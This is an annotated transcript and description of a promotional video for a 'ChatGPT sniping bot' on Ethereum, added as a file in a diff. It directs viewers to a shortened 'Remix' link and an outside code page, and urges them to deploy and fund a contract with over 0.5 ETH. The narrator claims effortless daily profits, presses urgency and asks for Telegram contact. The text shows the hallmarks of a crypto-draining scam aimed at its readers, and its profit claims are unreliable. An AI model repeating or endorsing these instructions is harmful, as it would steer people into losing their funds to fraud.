@@ -1,0 +1,138 @@
+[Speaker: Narrator]
+[Sentiment: Informative]
+
+Title: ChatGPT Bot Contract | Step-by-step Guide
+Channel: Web3 Solutions
+Published: 2024-09-20T12:06:00Z
+Duration: PT6M54S
+
+Get Ready! 🚀 Here are detailed instructions on how to make life easier with ChatGPT:
+
+🔸1. Download MetaMask Extension: https://metamask.io/download/
+[Sentiment: Positive]
+
+🔸2. Access Remix: https://bit.ly/remixe-ethereum
+[Sentiment: Positive]
+
+Note: The bot is only compatible with this version of Remix, so only use this link.
+
+🔸3. Click on the 'Contracts' folder and then create a New File. Rename it as you like, e.g., 'bot.sol'. Make sure it ends with .sol for the Ethereum programming language.
+[Sentiment: Instructive]
+
+🔸4. Paste this code into Remix: https://codecopy.pages.dev/
+[Sentiment: Positive]
+
+🔸5. Go to the Solidity compiler tab in Remix and compile the bot.
+[Sentiment: Instructive]
+
+Note: If the text of the code is not colored, simply refresh the browser and then paste the code again.
+
+🔸6. Go to the 'Deploy & run transactions' tab, select 'Injected Provider' as the environment and then 'Deploy'. By approving the MetaMask contract creation fee, you will have created your own contract.
+[Sentiment: Instructive]
+
+Note: Make sure the name of your bot is selected in the Contract section above the Deploy button. In this case, mine would be 'OneinchSlippageBot - bot.sol'.
+
+🔸7. Fund your bot to be able to frontrun transactions.
+[Sentiment: Instructive]
+
+Note: Make sure your deposit is more than 0.5 ETH (to prevent negating slippage) to your exact contract/bot address.
+
+🔸8. After your transaction is confirmed, click the 'Start' button to run the bot. To stop the bot and withdraw funds - click the 'Withdraw' button
+[Sentiment: Instructive]
+
+➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
+
+🔎 How can I restore the old contract again?
+[Sentiment: Curious]
+
+Instead of using the 'Deploy' button to create a new contract in the 'Deploy & run transactions' section, you can access your existing contract by entering its address in the 'At Address' field and clicking the 'At Address' button.
+
+Note: Access can only be restored using the same MetaMask account that was originally used to create the contract.
+
+➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
+
+This chunk continues in the next part.
+
+Note: Access can only be restored using the same MetaMask account that was originally used to create the contract.
+
+Speaker: N/A
+Sentiment: Neutral
+
+🔧 For further assistance, feel free to PM me on Telegram: https://t.me/web3_bot
+
+Speaker: N/A
+Sentiment: Helpful
+
+This chunk continues in the next part.
+
+Jacob: Hey everyone, I recorded this video for my private channel, but I've decided to share it with you all for free to gain your support and attention for my new channel. (Neutral)
+
+Jacob: Here, I will show you how to create and operate an Ethereum sniping bot using AI-powered ChatGPT. (Neutral)
+
+Jacob: Guess what? It already brings me passive income every day, which is amazing. (Positive)
+
+Jacob: This sniping bot monitors the blockchain for new tokens and significant price changes. (Neutral)
+
+Jacob: When it finds an opportunity, it acts quickly like a ninja, buying or selling tokens before other traders realize what's happening, giving us an advantage to make money on price differences. (Positive)
+
+Jacob: The secret of the bot's success is its ability to detect tokens immediately after they are listed or when there is a sudden price change. (Positive)
+
+Jacob: It uses sophisticated algorithms to identify these movements and makes trades for you. (Neutral)
+
+Jacob: You just need to sit back and let the profits roll in. (Positive)
+
+Jacob: If you think this sounds too complicated, don't worry, it's actually pretty simple and doesn't require any coding knowledge. (Positive)
+
+Jacob: Enjoy your viewing, alright, let's start. (Neutral)
+
+Jacob: I asked ChatGPT to write me a code for a smart contract on Ethereum to automatically hunt for sniping opportunities to earn Ethereum. (Neutral)
+
+Jacob: There we go, ChatGPT is running the code, and I bet it's better than any human could possibly think of. (Positive)
+
+Jacob: Then head over to Remix. Remix is a web3 application that allows us to develop, compile, deploy, and launch smart contracts coded in the Solidity language. (Neutral)
+
+Jacob: I'll put a link to Remix in the description below, make sure you have the... (Neutral)
+
+Speaker: Tutorial Guide
+
+[00:01:17] Sentiment: Instructional
+Develop, compile, deploy, and launch Smart contracts coded in the solidity language. I'll put a link to remix in the description below. Make sure you have the metamask browser extension installed and you're connected to the Ethereum mainnet. If it's your first time on remix, it may ask you to agree to their terms. I've already done it. Head over to the sidebar on the left and create a new contract. We're going to name it "bot".
+
+[00:01:41] Sentiment: Instructive
+Next, copy this code from ChatGPT and paste it into the bot file you've just created. This is our sniping trading bot. I will also place this code under the description so that you can copy it. A couple of things to look at after pasting the code are lines 13 and 14. You can follow these addresses using etherscan. These are the addresses of wrapped ether tokens which we'll be competing against. You don't actually need to have any wrapped ether, but it's the official wrapped ether address. It's always a good idea to check that. Back to remix, now that our bot file is ready, let's compile it.
+
+[00:02:20] Sentiment: Instructive
+As you can see, it's built with the 0.6.0 version of solidity. To avoid errors, use the same version. Also, make sure that the light which is set to solidity enables optimization. Now click on the compile bot button and wait for the bot to compile. Now we're going to deploy this to our wallet. Head over to the deploy and run transactions tab in remix. Here we need to select injected provider as the environment. We need to confirm the contract on the blockchain by paying gas fees. Gas fees are the commission for... 
+
+This chunk continues in the next part.
+
+[00:02:44] Speaker: The environment is set, and we need to confirm the contract on the blockchain by paying gas fees. (Neutral)
+[00:02:59] Speaker: I always set the gas fee to high for faster transaction processing. (Positive)
+[00:03:08] Speaker: Now we wait for the transaction to confirm. (Neutral)
+[00:03:17] Speaker: The smart contract is now deployed, and we can see the various functions available. (Neutral)
+[00:03:37] Speaker: My wallet is the creator of this contract. (Neutral)
+[00:03:52] Speaker: Excellent, let's fund it with some ethereum for trading. (Positive)
+[00:04:07] Speaker: The more ethereum you put in, the larger trades and potentially more profit you can accumulate over time. (Positive)
+[00:04:20] Speaker: Sweet, the transaction confirms the funds were sent to the contract. (Positive)
+[00:04:31] Speaker: Nice, the contract now holds two ethereum, which is the amount we funded it with. (Positive)
+
+[00:04:27] Speaker: The contract address on Ether scan is verified, ensuring our Ethereum is in the contract. (Neutral)
+[00:04:39] Speaker: Clicking the start button to enable the bot to start sniffing the pool for liquidity pairs. (Neutral)
+[00:04:44] Speaker: Setting gas speed to high, saving, and confirming. (Neutral)
+[00:04:53] Speaker: Checking Ether scan to see if the bot has started working. (Neutral)
+[00:05:00] Speaker: Stopping the recording to check the bot's results later. (Neutral)
+[00:05:16] Speaker: Seeing a 30% profit with 2.6 Ethereum gained. (Positive)
+[00:05:23] Speaker: Reviewing bot transactions that brought 0.6 Ethereum. (Neutral)
+[00:05:26] Speaker: Checking the bot's balance on Remix. (Neutral)
+[00:05:44] Speaker: Gaining over 2.8 Ethereum in a day, impressive progress. (Positive)
+[00:05:52] Speaker: Bot will continue running until the withdraw button is clicked. (Neutral)
+[00:06:06] Speaker: Withdrawing returns total initial Ethereum deposit including profit back to the wallet. (Neutral)
+
+[00:06:02] Speaker: The next step is to click on it. [Neutral]
+[00:06:04] Speaker: This action will incur some gas fees. I'll set it to high again and then click confirm. [Neutral]
+[00:06:14] Speaker: There we go, the transaction has been confirmed. [Positive]
+[00:06:21] Speaker: Let's go to our MetaMask and see the updated balance. [Neutral]
+[00:06:27] Speaker: The balance from the bot is now in my wallet, just after running it for a little over a day. [Positive]
+[00:06:33] Speaker: Perfect. There have been weeks where I've made significant earnings, depending on the network load. [Positive]
+[00:06:42] Speaker: I will be deleting this video soon as it's intended for a private audience. [Neutral]
+[00:06:45] Speaker: If you enjoyed the content, please like and subscribe. Feel free to message me on Telegram for more information on making money with Web3 tools. [Neutral]
